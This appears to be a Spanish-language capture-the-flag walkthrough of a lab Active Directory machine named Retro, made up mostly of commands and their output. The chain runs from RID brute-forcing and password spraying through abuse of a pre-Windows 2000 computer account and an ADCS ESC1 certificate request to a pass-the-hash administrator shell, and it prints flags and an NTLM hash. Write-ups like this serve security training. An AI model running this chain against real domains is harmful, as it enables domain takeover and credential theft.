>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.234.44
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-27 16:16 EST
Nmap scan report for 10.129.234.44
Host is up (0.063s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-27 21:17:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
50144/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61302/tcp open  msrpc         Microsoft Windows RPC
61316/tcp open  msrpc         Microsoft Windows RPC
63699/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.37 seconds
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ echo "10.129.234.44 retro.vl DC dc.retro.vl" >> /etc/hosts
```

>Enumeramos con netexec mediante la técnica **RID Brute-Force** los usuarios del dominio usando **Guest Login**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ nxc smb 10.129.234.44 -u 'guest' -p '' --rid-brute
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\guest: 
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
```

>Realizamos un **Password spray** para ver si los usuarios tienen alguna credencial débil como su propio usuario como credenciales:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ nxc smb 10.129.234.44 -u users -p users --continue-on-success
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)

<SNIP>
 
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee
```

>Enumeramos las shares de SMB con el usuario **trainee**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ nxc smb 10.129.234.44 -u trainee -p trainee --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.44   445    DC               Notes           READ            
SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ   
```

>Nos conectamos a las shares y leemos varios txt interesantes y la primera flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ smbclient -U "trainee%trainee" '\\10.129.234.44\Trainees'        
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 17:58:43 2023
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  Important.txt                       A      288  Sun Jul 23 18:00:13 2023

		4659711 blocks of size 4096. 1308046 blocks available
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ cat Important.txt                                  
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins 

┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ smbclient -U "trainee%trainee" '\\10.129.234.44\Notes'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr  8 23:12:49 2025
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  ToDo.txt                            A      248  Sun Jul 23 18:05:56 2023
  user.txt                            A       32  Tue Apr  8 23:13:01 2025

		4659711 blocks of size 4096. 1307770 blocks available
smb: \> get user.txt
getting file \user.txt of size 32 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (0.9 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                              
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ cat user.txt; echo; cat ToDo.txt
cbda362cff2099072c5e96c51712ff33
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

>Cuando las cuentas de máquina son creadas y pertenecen al grupo **Pre-Windows 2000 Compatible Access**, significa que por defecto tendrán como credenciales su **SamAccountName**:

>Probamos y no nos ha dado acceso denegado **STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT** así que debemos cambiarle la contraseña para poder iniciar sesión:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ nxc smb 10.129.234.44 -u 'banking$' -p banking 
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [-] retro.vl\banking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

>Cambiamos la contraseña con el método **RPC-SAMR** para que funcione:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ impacket-changepasswd 'retro.vl/banking$:banking@10.129.234.44' -newpass 'Password123$!' -p rpc-samr
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro.vl\banking$
[*] Connecting to DCE/RPC as retro.vl\banking$
[*] Password was changed successfully.
```

>Ya podemos iniciar sesión, además vemos que hay ADCS instalado:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ nxc ldap 10.129.234.44 -u 'banking$' -p 'Password123$!' -M adcs
[*] Initializing LDAP protocol database
LDAP        10.129.234.44   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.44   389    DC               [+] retro.vl\banking$:Password123$! 
ADCS        10.129.234.44   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.234.44   389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.129.234.44   389    DC               Found CN: retro-DC-CA
```

>Vemos con certipy que hay una plantilla que es vulnerable a **ESC1**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ certipy find -vulnerable -u 'banking$@retro.vl' -p 'Password123$!' -k -dc-ip 10.129.234.44 -target dc.retro.vl -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

>Obtenemos el SID del administrador, necesario para obtener el certificado válido:

```bash
┌──(kali㉿jbkira)-[~]
└─$ bloodyAD --host dc.retro.vl -u 'banking$' -p 'Password123$!' get object Administrator --attr objectSid

objectSid: S-1-5-21-2983547755-698260136-4283918172-500
```

>Pedimos un certificado PFX del **administrador** aprovechando el **ESC1**, debemos poner el key size custom ya que el default no da y poner el **SID del administrador** para que no de errores de SID mismatch:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ certipy req -u 'banking$@retro.vl' -p 'Password123$!' -target dc.retro.vl -template RetroClients -ca retro-DC-CA -upn 'Administrator@retro.vl' -key-size 4094 -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.retro.vl.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: RETRO.VL.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

>Nos autenticamos con el **pfx** para obtener el **hash NTLM** del administrador:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ sudo ntpdate 10.129.234.44
[sudo] password for kali: 
2025-12-27 16:38:33.463748 (-0500) +0.026806 +/- 0.031379 10.129.234.44 s1 no-leap

┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.234.44
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

>Nos conectamos por **WinRM** y leemos la flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/retro]
└─$ evil-winrm -i 10.129.234.44 -u Administrator -H 252fac7066d93dd009d4fd2cd0368389                      
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
40fce9c3f09024bcab29d377ee1ed071
